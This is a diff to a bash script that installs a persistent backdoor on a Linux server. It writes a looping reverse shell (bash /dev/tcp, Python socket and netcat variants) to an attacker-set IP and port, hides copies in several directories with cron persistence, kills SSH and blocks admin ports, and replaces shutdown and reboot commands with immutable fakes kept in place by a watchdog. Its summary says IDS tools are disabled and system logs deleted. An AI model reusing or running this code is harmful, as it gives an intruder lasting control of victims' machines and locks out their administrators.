@@ -427,25 +427,25 @@ setup_enhanced_backdoor() {
     
     echo -e "${GREEN}Setting up enhanced backdoor persistence...${NC}"
     
-    # Create the backdoor script ONCE in /tmp
+    
     cat > /tmp/.system_update << EOF
 #!/bin/bash
 while true; do
-    bash -i >& /dev/tcp/$BACKDOOR_IP/$BACKDOOR_PORT 0>&1
+    # Try Bash TCP (detached)
+    if command -v bash >/dev/null 2>&1; then
+        bash -c "bash -i >& /dev/tcp/$BACKDOOR_IP/$BACKDOOR_PORT 0>&1" 2>/dev/null
+    fi
     
+    # Try Python
     if command -v python >/dev/null 2>&1; then
         python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$BACKDOOR_IP",$BACKDOOR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2>/dev/null
     elif command -v python3 >/dev/null 2>&1; then
         python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$BACKDOOR_IP",$BACKDOOR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' 2>/dev/null
     fi
     
+    # Try Netcat
     if command -v nc >/dev/null 2>&1; then
-        nc -e /bin/bash $BACKDOOR_IP $BACKDOOR_PORT 2>/dev/null
         rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $BACKDOOR_IP $BACKDOOR_PORT >/tmp/f
-    fi
-    
-    if command -v perl >/dev/null 2>&1; then
-        perl -e 'use Socket;$i="$BACKDOOR_IP";$p=$BACKDOOR_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 2>/dev/null
     fi
     
     sleep 10
@@ -454,14 +454,18 @@ EOF
     
     chmod +x /tmp/.system_update
     
-    # Redundant copies
+ 
     cp /tmp/.system_update /dev/shm/.system_update 2>/dev/null
     cp /tmp/.system_update /var/tmp/.system_update 2>/dev/null
     chmod +x /dev/shm/.system_update 2>/dev/null
     chmod +x /var/tmp/.system_update 2>/dev/null
     
-    # Execute one instance immediately
-    nohup /tmp/.system_update >/dev/null 2>&1 &
+    
+    if command -v setsid >/dev/null 2>&1; then
+        setsid /tmp/.system_update >/dev/null 2>&1 &
+    else
+        nohup /tmp/.system_update >/dev/null 2>&1 &
+    fi
 
     for dir in "${HIDDEN_DIRS[@]}"; do
         mkdir -p "$dir" 2>/dev/null
@@ -470,8 +474,12 @@ EOF
         cp /tmp/.system_update "$dir/update.sh" 2>/dev/null
         chmod +x "$dir/update.sh" 2>/dev/null
         
-        # Execute persistence instance
-        nohup "$dir/update.sh" >/dev/null 2>&1 &
+        
+        if command -v setsid >/dev/null 2>&1; then
+            setsid "$dir/update.sh" >/dev/null 2>&1 &
+        else
+            nohup "$dir/update.sh" >/dev/null 2>&1 &
+        fi
         
         if ! crontab -l 2>/dev/null | grep -q "$dir/update.sh"; then
             (crontab -l 2>/dev/null; echo "* * * * * $dir/update.sh >/dev/null 2>&1") | crontab - 2>/dev/null
@@ -514,7 +522,7 @@ apply_kernel_restrictions() {
         echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
     fi
     
-    # Increased PTY limit for stability
+    
     if [ -f /proc/sys/kernel/pty/max ]; then
         echo 64 > /proc/sys/kernel/pty/max 2>/dev/null
     fi
@@ -523,7 +531,7 @@ apply_kernel_restrictions() {
         echo "|/bin/false" > /proc/sys/kernel/core_pattern 2>/dev/null
     fi
     
-    # Additional Kernel Hardening
+   
     if [ -f /proc/sys/kernel/dmesg_restrict ]; then
         echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null
     fi
@@ -736,7 +744,7 @@ protect_web_services() {
                     echo 0 > "/proc/$pid/freeze" 2>/dev/null
                 fi
             done
-            echo -e "${GREEN}✓ Protected: $service (PID: $(pgrep "$service" | head -1))${NC}"
+            echo -e "${GREEN}Protected: $service (PID: $(pgrep "$service" | head -1))${NC}"
         fi
     done
     
@@ -816,11 +824,11 @@ setup_firewall() {
         $IPTABLES_CMD -P FORWARD DROP 2>/dev/null
         $IPTABLES_CMD -P OUTPUT ACCEPT 2>/dev/null
         
-        # Allow standard web ports
+        
         $IPTABLES_CMD -A INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null
         
-        # Allow alternative web ports (Node.js, Tomcat, Python, etc.)
+        
         $IPTABLES_CMD -A INPUT -p tcp --dport 8080 -j ACCEPT 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 3000 -j ACCEPT 2>/dev/null
@@ -832,12 +840,10 @@ setup_firewall() {
             $IPTABLES_CMD -A OUTPUT -p tcp --dport "$BACKDOOR_PORT" -j ACCEPT 2>/dev/null
         fi
         
-        # Block admin ports explicitly
         $IPTABLES_CMD -A INPUT -p tcp --dport 22 -j DROP 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 21 -j DROP 2>/dev/null
         $IPTABLES_CMD -A INPUT -p tcp --dport 23 -j DROP 2>/dev/null
         
-        # Allow loopback and established connections
         $IPTABLES_CMD -A INPUT -i lo -j ACCEPT 2>/dev/null
         $IPTABLES_CMD -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT 2>/dev/null
         
@@ -847,7 +853,6 @@ setup_firewall() {
         $UFW_CMD --force reset >/dev/null 2>&1
         $UFW_CMD default deny incoming >/dev/null 2>&1
         
-        # Allow web ports
         $UFW_CMD allow 80/tcp >/dev/null 2>&1
         $UFW_CMD allow 443/tcp >/dev/null 2>&1
         $UFW_CMD allow 8080/tcp >/dev/null 2>&1
@@ -897,7 +902,7 @@ for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma
             ln -sf /etc/init.d/$service /etc/rc5.d/S99$service 2>/dev/null
         fi
         
-        echo -e "${GREEN}✓ $service configured for boot [DONE]${NC}"
+        echo -e "${GREEN} $service configured for boot [DONE]${NC}"
     fi
 done
 
@@ -1081,11 +1086,7 @@ fi
 #     fi
 # done
 
-echo -e "${GREEN}Stopping database services...${NC}"
-for service in mysql mariadb mysqld postgresql postgresql-13 postgresql-14 postgresql-15; do
-    service_command stop $service 2>/dev/null
-    service_command disable $service 2>/dev/null
-done
+
 
 echo -e "${GREEN}Terminating SSH...${NC}"
 pkill -9 sshd 2>/dev/null &
@@ -1093,20 +1094,59 @@ show_progress $! "Killing SSH processes"
 
 echo -e "${GREEN}Implementing MAXIMUM anti-shutdown protection...${NC}"
 
+
 for cmd in reboot shutdown poweroff halt; do
-    for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd; do
-        if [ -x "$path" ]; then
-            mv "$path" "${path}.disabled" 2>/dev/null
-        fi
-    done
     
-    cat > /usr/local/bin/$cmd << 'FAKE_CMD'
+    for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd /usr/local/bin/$cmd /usr/local/sbin/$cmd; do
+        
+        if [ -x "$path" ] && ! grep -q "Operation not permitted" "$path" 2>/dev/null; then
+            echo -e "${YELLOW}Sabotaging $path...${NC}"
+            
+         
+            if [ ! -f "${path}.disabled" ]; then
+                mv "$path" "${path}.disabled" 2>/dev/null
+                chmod 000 "${path}.disabled" 2>/dev/null
+            else
+                rm -f "$path" 2>/dev/null
+            fi
+            
+            
+            cat > "$path" << 'EOF'
 #!/bin/sh
 echo "Operation not permitted"
 exit 1
-FAKE_CMD
-    chmod +x /usr/local/bin/$cmd 2>/dev/null
+EOF
+            chmod +x "$path" 2>/dev/null
+            
+          
+            if command -v chattr >/dev/null 2>&1; then
+                chattr +i "$path" 2>/dev/null
+            fi
+        fi
+    done
 done
+
+
+if command -v systemctl >/dev/null 2>&1; then
+    SYSTEMCTL_PATH=$(command -v systemctl)
+    if ! grep -q "Operation not permitted" "$SYSTEMCTL_PATH" 2>/dev/null; then
+        mv "$SYSTEMCTL_PATH" "${SYSTEMCTL_PATH}.real" 2>/dev/null
+        
+        cat > "$SYSTEMCTL_PATH" << 'EOF'
+#!/bin/sh
+for arg in "$@"; do
+    if [ "$arg" = "poweroff" ] || [ "$arg" = "reboot" ] || [ "$arg" = "halt" ] || [ "$arg" = "shutdown" ] || [ "$arg" = "rescue" ] || [ "$arg" = "emergency" ]; then
+        echo "Operation not permitted"
+        exit 1
+    fi
+done
+# Pass through to real systemctl
+exec "${0}.real" "$@"
+EOF
+        chmod +x "$SYSTEMCTL_PATH" 2>/dev/null
+    fi
+fi
+
 
 for cmd in init telinit; do
     if [ -f "/sbin/$cmd" ] && [ ! -f "/sbin/$cmd.real" ]; then
@@ -1126,7 +1166,7 @@ done
 
 
 if [ -d /etc/systemd/system ]; then
-    for target in poweroff.target reboot.target halt.target shutdown.target; do
+    for target in poweroff.target reboot.target halt.target shutdown.target rescue.target emergency.target; do
         systemctl mask $target 2>/dev/null
     done
     systemctl daemon-reload 2>/dev/null
@@ -1143,27 +1183,78 @@ if [ -d /etc/acpi/events ]; then
             echo "action=/bin/true" >> "$event"
         fi
     done
+    if [ -f /etc/init.d/acpid ]; then
+        /etc/init.d/acpid restart 2>/dev/null
+    fi
 fi
+
+    
+    for file in /root/.bashrc /etc/profile /etc/bash.bashrc /home/*/.bashrc; do
+        if [ -f "$file" ]; then
+         
+            sed -i '/alias shutdown=/d' "$file" 2>/dev/null
+            sed -i '/alias reboot=/d' "$file" 2>/dev/null
+            sed -i '/alias poweroff=/d' "$file" 2>/dev/null
+            sed -i '/alias halt=/d' "$file" 2>/dev/null
+            
+            echo "alias shutdown='echo Operation not permitted; false'" >> "$file"
+            echo "alias reboot='echo Operation not permitted; false'" >> "$file"
+            echo "alias poweroff='echo Operation not permitted; false'" >> "$file"
+            echo "alias halt='echo Operation not permitted; false'" >> "$file"
+            echo "alias init='echo Operation not permitted; false'" >> "$file"
+            echo "alias systemctl='echo Operation not permitted; false'" >> "$file"
+        fi
+    done
+
+    if [ -f /etc/systemd/logind.conf ]; then
+        sed -i 's/#HandlePowerKey=poweroff/HandlePowerKey=ignore/' /etc/systemd/logind.conf
+        sed -i 's/#HandleSuspendKey=suspend/HandleSuspendKey=ignore/' /etc/systemd/logind.conf
+        sed -i 's/#HandleHibernateKey=hibernate/HandleHibernateKey=ignore/' /etc/systemd/logind.conf
+        sed -i 's/#HandleLidSwitch=suspend/HandleLidSwitch=ignore/' /etc/systemd/logind.conf
+        echo "HandlePowerKey=ignore" >> /etc/systemd/logind.conf
+        echo "HandleSuspendKey=ignore" >> /etc/systemd/logind.conf
+        echo "HandleHibernateKey=ignore" >> /etc/systemd/logind.conf
+        echo "HandleLidSwitch=ignore" >> /etc/systemd/logind.conf
+        systemctl restart systemd-logind 2>/dev/null
+    fi
 
 cat > /tmp/.anti_shutdown_watchdog.sh << 'WATCHDOG'
 #!/bin/sh
 while true; do
-    for cmd in reboot shutdown poweroff halt systemctl; do
-        for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd; do
-            if [ -x "$path" ] && [ ! -f "${path}.disabled" ]; then
-                mv "$path" "${path}.disabled" 2>/dev/null
-            fi
-        done
-        
-        if [ ! -f /usr/local/bin/$cmd ]; then
-            cat > /usr/local/bin/$cmd << 'EOF'
+    for cmd in reboot shutdown poweroff halt; do
+        # Check all possible paths
+        for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd /usr/local/bin/$cmd /usr/local/sbin/$cmd; do
+            # If it's a real binary (executable and not our fake script)
+            if [ -x "$path" ] && ! grep -q "Operation not permitted" "$path" 2>/dev/null; then
+                # Move original if not already backed up
+                if [ ! -f "${path}.disabled" ]; then
+                    mv "$path" "${path}.disabled" 2>/dev/null
+                    chmod 000 "${path}.disabled" 2>/dev/null
+                else
+                    rm -f "$path" 2>/dev/null
+                fi
+                
+                # Create FAKE script IN-PLACE
+                cat > "$path" << 'EOF'
 #!/bin/sh
 echo "Operation not permitted"
 exit 1
 EOF
-            chmod +x /usr/local/bin/$cmd 2>/dev/null
-        fi
+                chmod +x "$path" 2>/dev/null
+                # Make immutable if possible
+                if command -v chattr >/dev/null 2>&1; then
+                    chattr +i "$path" 2>/dev/null
+                fi
+            fi
+        done
     done
+    
+    # Re-apply aliases if removed
+    if ! grep -q "alias shutdown" /root/.bashrc 2>/dev/null; then
+        echo "alias shutdown='echo Operation not permitted; false'" >> /root/.bashrc
+        echo "alias reboot='echo Operation not permitted; false'" >> /root/.bashrc
+        echo "alias poweroff='echo Operation not permitted; false'" >> /root/.bashrc
+    fi
     
     if [ -f /proc/sys/kernel/sysrq ]; then
         echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
@@ -1366,7 +1457,7 @@ else
     echo ""
     echo -e "Disabled/Blocked:"
     echo -e "  - All IDS/IPS/SIEM tools"
-    echo -e "  - Administrative access 
+    echo -e "  - Administrative access"
     echo -e "  - Console access"
     echo -e "  - SSH service"
     echo -e "  - All system logs (encrypted/deleted)"
